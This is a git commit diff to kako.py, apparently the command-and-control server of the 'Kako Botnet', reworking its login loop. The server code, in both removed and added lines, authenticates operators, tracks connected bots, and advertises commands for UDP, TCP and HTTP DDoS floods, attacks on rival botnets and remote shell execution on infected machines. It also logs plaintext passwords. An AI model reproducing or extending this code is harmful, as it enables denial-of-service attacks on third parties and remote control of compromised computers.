57443a16e3e21de08c1a27255bb242c925cf46be
Law <36631640+LawOfTime@users.noreply.github.com>
2018-08-06 17:13:21 +0100

    Update kako.py

--- kako.py
+++ kako.py
@@ -1,6 +1,6 @@
 # To create an account make a file called "login.txt" and follow instructions below.
 # Login Format: Username:Password:ID, (Admin: 1 | Others: 0)
-# For some reason the login keeps messing up
+# Login is broken I think... and some other things. Dont Use
 import sys
 import time
 import socket
@@ -72,158 +72,162 @@ def clientThread(conn):
 			lines = login.readlines()
 
 		username = username(conn)
-		password = password(conn)
-
-		for line in lines:
-			if line.split(":")[0].startswith(username) and line.split(":")[1].startswith(password):
-				conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
-				conn.sendall("[?] Please use the custom client.py made by Feitan\r\n")
-				conn.sendall("[?] Type >help for a list of commands\r\n")
-				conn.sendall("[?] Your username is: %s\r\n" % username)
-				bc.append(conn)
-				try:
-					if line.split(":")[2].startswith("1"):
-						adminIP.append("%s | %s" % (username, ip))
-						admin.append(username)
-					else:
-						userIP.append("%s | %s" % (username, ip))
-						user.append(username)
-				except:
-					break
-				while True:
+		try:
+			password = password(conn)
+		except:
+			conn.close()
+			
+		while True:
+			for line in lines:
+				if line.split(":")[0].startswith(username) and line.split(":")[1].startswith(password):
+					conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
+					conn.sendall("[?] Please use the custom client.py made by Feitan\r\n")
+					conn.sendall("[?] Type >help for a list of commands\r\n")
+					conn.sendall("[?] Your username is: %s\r\n" % username)
+					bc.append(conn)
 					try:
-						message = conn.recv(512)
-
-						if message:
-							if line.split(":")[2].startswith("1"):
-								nick = "* [%s] " % (username)
-							else:
-								nick = "[%s] " % (username)
-							reply = "%s\r" % (message)
-							broadcast(nick, conn)
-							broadcast(reply, conn)
+						if line.split(":")[2].startswith("1"):
+							adminIP.append("%s | %s" % (username, ip))
+							admin.append(username)
 						else:
-							remove(conn)
-
-						logs = file("logs.txt", "a")
-						logs.write("%s:%s - %s\r\n" % (username, password, message))
-
-						if message.lower().startswith(">help"):
-							conn.sendall("[>] Helpful Info [<]\r\n")
-							conn.sendall("[>] and [<] = Notice\r\n")
-							conn.sendall("[?] = Information\r\n")
-							conn.sendall("[!] = Warning\r\n")
-							conn.sendall("\r\n")
-							conn.sendall("[>] Server Commands [<]\r\n")
-							conn.sendall("[?] >help - Displays a help menu like this\r\n")
-							conn.sendall("[?] >status - Displays Clients and Bots connected\r\n")
-							conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
-							conn.sendall("[?] >users - Displays everyones username\r\n")
-							conn.sendall("\r\n")
-							conn.sendall("[>] Bot Commands [<]\r\n")
-							conn.sendall("[!] Warning! These commands are built into the client made by Feitan not the server\r\n")
-							conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
-							conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
-							conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
-							conn.sendall("[?] >cnc [Target] [Port] [Amount of Connections] - This is an attack on other CNC Botnets\r\n")
-							conn.sendall("[?] >killbots - Disconnects all bots\r\n")
-							conn.sendall("[?] >shell [Command] - Allows the host to use commands from the bots terminal\r\n")
-							conn.sendall("[?] >killattk - Stops all on going DDoS attacks\r\n")
-							if line.split(":")[2].startswith("1"):
-								conn.sendall("\r\n")
-								conn.sendall("[>] Admin Commands [<]\r\n")
-								conn.sendall("[?] >createuser - Allows you to create an account\r\n")
-
-						if message.lower().startswith(">status"):
-							conn.sendall("[+] Clients Connected: %s\r\n" % clients)
-							conn.sendall("[+] Bots Connected: %s\r\n" % bots)
-
-						if message.lower().startswith(">credits"):
-							conn.sendall("[>] Santa [<]\r\n")
-							conn.sendall("[?] Feitan - Idea and main Programmer. Programmed client.py alone.\r\n")
-							conn.sendall("[>] Santa\'s Little Helpers [<]\r\n")
-							conn.sendall("[?] Picses - Programmed the bot connection.\r\n")
-							conn.sendall("[?] Mac.G - Helped making Server <=> Client communication.\r\n")
-							conn.sendall("[?] x7041 - Fixed the login over lap.\r\n")
-
-						if message.lower().startswith(">users"):
-							if line.split(":")[2].startswith("1"):
-								conn.sendall("Admins: %s\r\n" % adminsIP)
-								conn.sendall("Users: %s\r\n" % usersIP)
-							else:
-								conn.sendall("Admins: %s\r\n" % admins)
-								conn.sendall("Users: %s\r\n" % users)
-
-						if message.lower().startswith(">createuser"):
-							if line.split(":")[2].startswith("1"):
-								remove(conn)
-								conn.send("[>] Username and Password must be 3 or more characters long [<]\r\n")
-								def newUser(conn, prefix="Username: "):
-									conn.send(prefix)
-									data = conn.recv(512)
-									if data:
-										return conn.recv(512)
-
-								def newPass(conn, prefix="Password: "):
-									conn.send(prefix)
-									data = conn.recv(512)
-									if data:
-										return conn.recv(512)
-
-								def newID(conn, prefix="ID: "):
-									conn.send(prefix)
-									data = conn.recv(512)
-									if data:
-										return conn.recv(512)
-
-								newUser = newUser(conn)
-								newPass = newPass(conn)
-								newID = newID(conn)
-
-								uLen = len(newUser)
-								pLen = len(newPass)
-								iLen = len(newID)
-
-								try:
-									with open("login.txt", "a") as login:
-										if uLen >= 3 and pLen >= 3 and iLen >= 1:
-											login.write("\n%s:%s:%s" % (newUser, newPass, newID))
-											conn.sendall("[?] Username: %s\r\n" % newUser)
-											conn.sendall("[?] Password: %s\r\n" % newPass)
-											conn.sendall("[?] ID: %s\r\n" % newID)
-										else:
-											pass
-								except:
-									pass
-								bc.append(conn)
+							userIP.append("%s | %s" % (username, ip))
+							user.append(username)
 					except:
 						break
-					if not message:
+					while True:
 						try:
-							adminIP.remove("%s | %s" % (username, ip))
-							admin.remove(username)
+							message = conn.recv(512)
+
+							if message:
+								if line.split(":")[2].startswith("1"):
+									nick = "* [%s] " % (username)
+								else:
+									nick = "[%s] " % (username)
+								reply = "%s\r" % (message)
+								broadcast(nick, conn)
+								broadcast(reply, conn)
+							else:
+								remove(conn)
+
+							logs = file("logs.txt", "a")
+							logs.write("%s:%s - %s\r\n" % (username, password, message))
+
+							if message.lower().startswith(">help"):
+								conn.sendall("[>] Helpful Info [<]\r\n")
+								conn.sendall("[>] and [<] = Notice\r\n")
+								conn.sendall("[?] = Information\r\n")
+								conn.sendall("[!] = Warning\r\n")
+								conn.sendall("\r\n")
+								conn.sendall("[>] Server Commands [<]\r\n")
+								conn.sendall("[?] >help - Displays a help menu like this\r\n")
+								conn.sendall("[?] >status - Displays Clients and Bots connected\r\n")
+								conn.sendall("[?] >credits - Displays the Programmers and Helpers\r\n")
+								conn.sendall("[?] >users - Displays everyones username\r\n")
+								conn.sendall("\r\n")
+								conn.sendall("[>] Bot Commands [<]\r\n")
+								conn.sendall("[!] Warning! These commands are built into the client made by Feitan not the server\r\n")
+								conn.sendall("[?] >udp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol UDP\r\n")
+								conn.sendall("[?] >tcp [Target] [Packet Size(MAX: 65500)] [Time(S)] - DDoS Attack with the protocol TCP\r\n")
+								conn.sendall("[?] >http [Target(without http://)] [Threads] [Time(S)] - HTTP DDoS Attack\r\n")
+								conn.sendall("[?] >cnc [Target] [Port] [Amount of Connections] - This is an attack on other CNC Botnets\r\n")
+								conn.sendall("[?] >killbots - Disconnects all bots\r\n")
+								conn.sendall("[?] >shell [Command] - Allows the host to use commands from the bots terminal\r\n")
+								conn.sendall("[?] >killattk - Stops all on going DDoS attacks\r\n")
+								if line.split(":")[2].startswith("1"):
+									conn.sendall("\r\n")
+									conn.sendall("[>] Admin Commands [<]\r\n")
+									conn.sendall("[?] >createuser - Allows you to create an account\r\n")
+
+							if message.lower().startswith(">status"):
+								conn.sendall("[+] Clients Connected: %s\r\n" % clients)
+								conn.sendall("[+] Bots Connected: %s\r\n" % bots)
+
+							if message.lower().startswith(">credits"):
+								conn.sendall("[>] Santa [<]\r\n")
+								conn.sendall("[?] Feitan - Idea and main Programmer. Programmed client.py alone.\r\n")
+								conn.sendall("[>] Santa\'s Little Helpers [<]\r\n")
+								conn.sendall("[?] Picses - Programmed the bot connection.\r\n")
+								conn.sendall("[?] Mac.G - Helped making Server <=> Client communication.\r\n")
+								conn.sendall("[?] x7041 - Fixed the login over lap.\r\n")
+
+							if message.lower().startswith(">users"):
+								if line.split(":")[2].startswith("1"):
+									conn.sendall("Admins: %s\r\n" % adminsIP)
+									conn.sendall("Users: %s\r\n" % usersIP)
+								else:
+									conn.sendall("Admins: %s\r\n" % admins)
+									conn.sendall("Users: %s\r\n" % users)
+
+							if message.lower().startswith(">createuser"):
+								if line.split(":")[2].startswith("1"):
+									remove(conn)
+									conn.send("[>] Username and Password must be 3 or more characters long [<]\r\n")
+									def newUser(conn, prefix="Username: "):
+										conn.send(prefix)
+										data = conn.recv(512)
+										if data:
+											return conn.recv(512)
+
+									def newPass(conn, prefix="Password: "):
+										conn.send(prefix)
+										data = conn.recv(512)
+										if data:
+											return conn.recv(512)
+
+									def newID(conn, prefix="ID: "):
+										conn.send(prefix)
+										data = conn.recv(512)
+										if data:
+											return conn.recv(512)
+
+									newUser = newUser(conn)
+									newPass = newPass(conn)
+									newID = newID(conn)
+
+									uLen = len(newUser)
+									pLen = len(newPass)
+									iLen = len(newID)
+
+									try:
+										with open("login.txt", "a") as login:
+											if uLen >= 3 and pLen >= 3 and iLen >= 1:
+												login.write("\n%s:%s:%s" % (newUser, newPass, newID))
+												conn.sendall("[?] Username: %s\r\n" % newUser)
+												conn.sendall("[?] Password: %s\r\n" % newPass)
+												conn.sendall("[?] ID: %s\r\n" % newID)
+											else:
+												pass
+									except:
+										pass
+									bc.append(conn)
 						except:
-							pass
-						try:
-							userIP.remove("%s | %s" % (username, ip))
-							user.remove(username)
-						except:
-							pass
-						conn.close()
-						break
-		else:
-			try:
-				ip = load(urlopen('http://jsonip.com'))['ip']
-				fail = file("fails.txt", "a")
-				fail.write("%s:%s:%s\r\n" % (ip, username, password))
-				conn.send("[!] Incorrect Information!\r\n")
-				conn.send("[!] Your IP Address has been logged.\r\n")
-				clientDisconnect()
-				time.sleep(3)
-				conn.close()
-			except:
-				clientDisconnect()
-				conn.close()
+							break
+						if not message:
+							try:
+								adminIP.remove("%s | %s" % (username, ip))
+								admin.remove(username)
+							except:
+								pass
+							try:
+								userIP.remove("%s | %s" % (username, ip))
+								user.remove(username)
+							except:
+								pass
+							conn.close()
+							break
+			else:
+				try:
+					ip = load(urlopen('http://jsonip.com'))['ip']
+					fail = file("fails.txt", "a")
+					fail.write("%s:%s:%s\r\n" % (ip, username, password))
+					conn.send("[!] Incorrect Information!\r\n")
+					conn.send("[!] Your IP Address has been logged.\r\n")
+					clientDisconnect()
+					time.sleep(3)
+					conn.close()
+				except:
+					clientDisconnect()
+					conn.close()
 	except:
 		clientDisconnect()
 		pass
@@ -252,7 +256,7 @@ def bot_thread(conn):
 		conn.send(">killbots")
 		conn.close()
 
-	ips.append(ip)
+	#ips.append(ip)
 	while True:
 		try:
 			data = conn.recv(512)
@@ -261,7 +265,7 @@ def bot_thread(conn):
 			break
 		if not data:
 			pass
-	ips.remove(ip)
+	#ips.remove(ip)
 	botDisconnect()
 	conn.close()
 
